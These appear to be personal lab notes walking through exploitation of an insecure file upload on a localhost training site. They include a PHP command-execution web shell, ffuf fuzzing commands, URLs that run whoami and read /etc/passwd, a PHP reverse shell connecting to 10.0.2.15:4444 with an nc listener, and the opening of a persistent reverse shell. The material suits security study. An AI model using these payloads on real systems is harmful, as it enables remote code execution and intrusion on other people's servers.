### **Insecure File Upload 0x01 :**

-  **First thing we must** do is **find what type of file is the uploader in the site, accepting**, is it `.txt`,`.png`, `.jpeg`, `.pdf`, `.docs`,`.xls`.
	-  Like in the lab itself, if we try to upload files of other type, then we get this : 
		- ![[file upload file type.png]]
-  Second thing, check if the **client is making any request to the service to file type checking.**
	-  you can check that in **Network tab** in dev tools.

####  **Goal is to upload a php file in the server and call it from the url.**

> Before upload the file to the site, first make sure you move the actual logo file to labs/uploads.

-  First lets see the `content-type` in request when we upload a image file type.
	- ![[autcall file type data.png]]
	-  ![[image file type for file upload vuln.png]]

-  Now lets manipulate this data, so that we can **upload file of text type as of now.**
	-  Remove the file content the `data in green represents the data of the file`.
	-  And then type `Hello there`
		-  ![[logo file changed to text file and uploaded using burp suite..png]]

- **Now Lets make the actual `php file` through which we can perform command execution.**
	-  `<?php system($_GET['cmd']); ?>`  
		-  ![[command php file uploaded..png]]
		- ![[checking if the cmd php is there in site.png]]
		-  Now to call this `cmd.php` we have to do that **from the url, by finding the current path for it.**
			-  To find the path, we will have to FUZZ.
			-  Command to perform that `ffuf -u http://localhost/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt ` filter out request with same sizes or words.
			- ![[fuzz output for find lab upload folder.png]]
			-  Command to fuzz in localhost/labs/FUZZ : `fuf -u http://localhost/labs/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt` ilter out request with same sizes or words.
			-  ![[upload folder found after fuzzing.png]]
			-  And there it is cmd.php in uploads folder : `http://localhost/labs/uploads/cmd.php`
				-  ![[cmd php in uploads folder.png]]
				- Now to get information using cmd.php : used search_query that `?cmd=search_query`
					-  For getting whoami : `http://localhost/labs/uploads/cmd.php?cmd=whoami`
						-  ![[whoami value thorugh file upload.png]]
					- For getting /etc/passwd :`http://localhost/labs/uploads/cmd.php?cmd=cat%20/etc/passwd`
						- ![[etc passwd data with file upload.png]]

#### For getting reverse shell :
-  upload the new shell file with this php code.
```php
<?php
$sock=fsockopen("10.0.2.15",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```
 - start the listener in terminal : `nc -lvnp 4444`
	- call the shell.php through url, access it
		-  ![[shell php is uploaded..png]]

	-  **But the shell won't last long**.
			-  ![[shell won;t last long.png]]


#### For a **persistent** shell : 
  -  use one of the following code : 
				```php
					<?php
					set_time_limit(0);
					$ip='10.0.2.15';
					$port=4444;
					$chunk_size=1400;
					$write_a=null;
					$error_a=null;
					$shell='uname -a; w; id; /bin/sh -i';
					$daemon=0;
					$debug=0;
					
					// ... [full persistent PHP reverse shell code] ...
					?>
				```